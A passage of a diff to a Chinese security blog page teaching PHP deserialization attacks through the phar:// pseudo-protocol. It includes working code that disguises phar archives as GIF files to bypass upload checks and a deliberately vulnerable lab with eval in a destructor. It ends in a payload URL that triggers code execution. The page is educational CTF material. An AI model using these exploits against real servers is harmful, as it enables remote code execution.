class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();   <span class="comment">//开始缓冲对phar的写操作</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);    <span class="comment">//设置识别phar拓展的标识stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; data = <span class="string">&#x27;h4ck3r&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);      <span class="comment">//将自定义的归档元数据meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);     <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();    <span class="comment">//停止缓冲对phar的写操作</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>访问后，会生成一个phar.phar文件在当前目录下：</p>
+</li>
+<li><p>用winhex打开，可以看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过 phar:&#x2F;&#x2F; 伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p>
+</li>
+</ul>
+<p>如果这时候网站有一个这样的页面：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>它可以通过伪协议包含我们的phar文件，那么在包含的过程中就会进行反序列化。访问它：</p>
+<p>输出出我们的文字</p>
+<p>示例——将phar伪造成其他格式的文件<br>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加 任意的文件头 + 修改后缀名 的方式将phar文件伪装成其他格式的文件。基本操作：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$object</span> -&gt; data = <span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>采用这种方法可以绕过很大一部分上传检测。</p>
+<h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ul>
+<li>phar文件要能够上传到服务器端（如GET、POST），并且要有file_exists()，fopen()，file_get_contents()，file()，include()等文件操作的函数</li>
+<li>要有可用的魔术方法作为“跳板”</li>
+<li>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤。</li>
+</ul>
+<p>漏洞复现环境：<br>upload_file.php，后端检测文件上传，检测文件类型是否为gif，文件后缀名是否为gif<br>upload_file.html，前端文件上传表单<br>file_un.php，存在file_exists()，并且存在__destruct()</p>
+<p>upload_file.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload_file/&quot;</span> .<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>upload_file.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>file_un.php：（存在file_exists()，并且存在__destruct()，漏洞点）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>);   <span class="comment">// 漏洞点</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实现过程：</strong><br>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过为gif的限制，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar:&#x2F;&#x2F;执行代码</p>
+<p><strong>构造代码：</strong><br>eval.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span> = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">AnyClass</span>();</span><br><span class="line"><span class="variable">$object</span> -&gt; output= <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>（记住这个做题步骤，以后可以直接套用）<br>访问eval.php，会在当前目录生成phar.phar，然后修改后缀 gif</p>
+<p>接着上传,文件会上传到upload_file目录下</p>
+<p>然后利用file_un.php。<br>构造payload：</p>
+<p><code>/?filename=phar://upload_file/phar.gif</code> 即可访问到phpinfo目录</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h3><ul>
+<li>根据<strong>访问控制修饰符</strong>的不同 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同：<ul>
+<li>protected属性被序列化的时候属性值会变成<code>%00*%00属性名</code></li>
+<li>private属性被序列化的时候属性值会变成<code>%00类名%00属性名</code><ul>
+<li>(%00为空白符，空字符也有长度，一个空字符长度为 1）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public(公有) </span><br><span class="line">protected(受保护)     // %00*%00属性名</span><br><span class="line">private(私有的)       // %00类名%00属性名</span><br></pre></td></tr></table></figure>
+<p>eg:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;Sch0lar&#x27;</span>; </span><br><span class="line">  	<span class="keyword">protected</span> <span class="variable">$age</span>=<span class="string">&#x27;19&#x27;</span>; </span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&#x27;get flag&#x27;</span>; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>(); <span class="comment">//实例化一个对象 </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>); <span class="meta">?&gt;</span> </span><br><span class="line"> <span class="comment">//输出结果 O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;</span></span><br><span class="line"> <span class="comment">//可以看到</span></span><br><span class="line">    s:<span class="number">6</span>:<span class="string">&quot;*age&quot;</span>   <span class="comment">//*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6</span></span><br><span class="line">		s:<span class="number">9</span>:<span class="string">&quot;Ctfflag&quot;</span>   <span class="comment">//类名Ctf前后出现两个%00空白符，所以长度为9</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h3><p>序列化：将一个对象转换成字符串。把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test1</span> = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="variable">$test3</span> = <span class="number">123456</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>); <span class="comment">//  s:11:&quot;hello world&quot;;  序列化字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>); <span class="comment">// a:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:5:&quot;world&quot;;&#125; 序列化数组</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test3</span>); <span class="comment">//  i:123456;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hello</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);  <span class="comment">//  O:5:&quot;hello&quot;:1:&#123;s:5:&quot;test4&quot;;s:11:&quot;hello,world&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>序列化对象时，首字母代表参数类型。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a – array 数组</span><br><span class="line">b – boolean布尔型</span><br><span class="line">d – double双精度型</span><br><span class="line">i – integer(int)</span><br><span class="line">o – common object一般对象</span><br><span class="line">r – reference</span><br><span class="line">s – string</span><br><span class="line">C – custom object 自定义对象</span><br><span class="line">O – class</span><br><span class="line">N – null</span><br><span class="line">R – pointer reference</span><br><span class="line">U – unicode string unicode编码的字符串</span><br></pre></td></tr></table></figure></li>
+<li>参数后面的数字代表参数的长度。</li>
+<li>序列化字符串格式： 变量类型：变量长度：变量内容</li>
+<li>如果序列化的是一个对象，序列化字符串格式为：<br><code>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝</code><br>如上面的<code>O:5:&quot;hello&quot;:1:&#123;s:5:&quot;test4&quot;;s:11:&quot;hello,world&quot;</code></li>
+</ul>
+<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105891381">PHP序列化反序列化漏洞总结（一篇懂）</a></p>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.oop5.magic.php">魔术方法：官方文档中介绍</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.freebuf.com/column/151447.html">http://www.freebuf.com/column/151447.html</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.lsablog.com/network_security/penetration/php-unserialize-bug-summary/">http://www.lsablog.com/network_security/penetration/php-unserialize-bug-summary/</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/116705.html">http://www.freebuf.com/vuls/116705.html</a></p>
@@ -538,9 +708,9 @@
     
         <div class="license-wrapper">
             <p>Author：<a href="https://yinwc.github.io">Y1ZkRA</a>
-            <p>Link：<a href="https://yinwc.github.io/2018/06/03/phpmagic/">https://yinwc.github.io/2018/06/03/phpmagic/</a>
-            <p>Publish date：<a href="https://yinwc.github.io/2018/06/03/phpmagic/">June 3rd 2018, 3:46:59 pm</a>
-            <p>Update date：<a href="https://yinwc.github.io/2018/06/03/phpmagic/">January 28th 2023, 3:30:51 pm</a>
+            <p>Link：<a href="https://yinwc.github.io/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://yinwc.github.io/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
+            <p>Publish date：<a href="https://yinwc.github.io/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">June 3rd 2018, 3:46:59 pm</a>
+            <p>Update date：<a href="https://yinwc.github.io/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">March 6th 2023, 4:03:28 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -695,7 +865,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PHP中的反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.</span> <span class="toc-text">序列化:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">反序列化存在的问题</span></a></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化POP链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-7124"><span class="toc-number">1.3.</span> <span class="toc-text">绕过魔法方法的反序列化漏洞(CVE-2016-7124)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.</span> <span class="toc-text">PHP SESSION反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.1.</span> <span class="toc-text">简介与基础知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">实际利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">phar伪协议触发php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.0.1.</span> <span class="toc-text">漏洞利用条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">4.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">访问控制修饰符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.2.</span> <span class="toc-text">php序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">php反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1330,6 +1500,14 @@
         
         
     
+        
+        
+        
+        
+        
+        
+        
+        
         
         
         
@@ -3462,7 +3640,7 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">06/03</span>
-            <a class="archive-post-title" href="/2018/06/03/phpmagic/">反序列化漏洞</a>
+            <a class="archive-post-title" href="/2018/06/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化漏洞</a>
         </li>
     
         
@@ -3530,14 +3708,14 @@
                 CTF
             </span>
         
-            <span class="sidebar-tag-name" data-tags="企业安全">
-                <span class="iconfont-archer">&#xe606;</span>
-                企业安全
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="learn">
                 <span class="iconfont-archer">&#xe606;</span>
                 learn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="企业安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                企业安全
             </span>
         
             <span class="sidebar-tag-name" data-tags="python">
@@ -3553,6 +3731,11 @@
             <span class="sidebar-tag-name" data-tags="安全评估">
                 <span class="iconfont-archer">&#xe606;</span>
                 安全评估
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="前端安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                前端安全
             </span>
         
             <span class="sidebar-tag-name" data-tags="安全开发">
@@ -3585,11 +3768,6 @@
                 应急响应
             </span>
         
-            <span class="sidebar-tag-name" data-tags="前端安全">
-                <span class="iconfont-archer">&#xe606;</span>
-                前端安全
-            </span>
-        
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
     <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
@@ -3606,9 +3784,9 @@
             blog
         </span>
     
-        <span class="sidebar-category-name" data-categories="漏洞总结">
+        <span class="sidebar-category-name" data-categories="漏洞">
